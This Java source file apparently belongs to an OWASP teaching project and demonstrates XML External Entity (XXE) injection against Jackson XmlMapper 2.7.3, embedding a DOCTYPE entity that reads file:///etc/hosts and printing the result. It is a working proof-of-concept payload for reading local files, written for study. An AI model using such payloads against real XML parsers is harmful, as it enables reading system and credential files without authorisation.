package com.doku.doku_owasp_example.xxe.example;

import com.doku.doku_owasp_example.xxe.model.Note;
import com.fasterxml.jackson.dataformat.xml.XmlMapper;

/**
 * @author Daniel Joi Partogi Hutapea
 */
public class XxeOnJacksonXmlMapper
{
    public static void main(String[] args) throws Exception
    {
        String xmlData = "" +
                "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
                "<!DOCTYPE test [\n" +
                "    <!ENTITY xxe SYSTEM \"file:///etc/hosts\">\n" +
                "    <!ENTITY footer \"Copyleft by djph-inc.com!\">\n" +
                "]>\n" +
                "<note>\n" +
                "    <to>&xxe;</to>\n" +
                "    <from>Daniel</from>\n" +
                "    <heading>Reminder</heading>\n" +
                "    <body>Don't forget me this weekend!</body>\n" +
                "    <footer>&footer;</footer>\n" +
                "</note>";

        // Use Jackson version 2.7.3 to simulate vulnerability (com.fasterxml.jackson.dataformat:jackson-dataformat-xml:2.7.3)
        XmlMapper xmlMapper = new XmlMapper();
        Note note = xmlMapper.readValue(xmlData, Note.class);

        System.out.println("====================================================");
        System.out.println("/etc/hosts file content:");
        System.out.println(note.getTo());
        System.out.println("====================================================");
    }
}
